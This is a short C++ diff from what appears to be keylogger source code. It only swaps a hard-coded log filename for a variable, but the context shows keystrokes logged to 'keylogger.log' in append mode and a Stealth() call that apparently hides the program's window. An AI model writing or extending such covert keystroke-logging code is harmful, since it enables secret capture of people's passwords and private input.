@@ -214,8 +214,7 @@ int main()
     // open output file in append mode
     const char* output_filename = "keylogger.log";
     std::cout << "Logging output to " << output_filename << std::endl;
-
-    output_file.open("keylogger.log", std::ios_base::app);
+    output_file.open(output_filename, std::ios_base::app);
 
     // visibility of window
     Stealth();
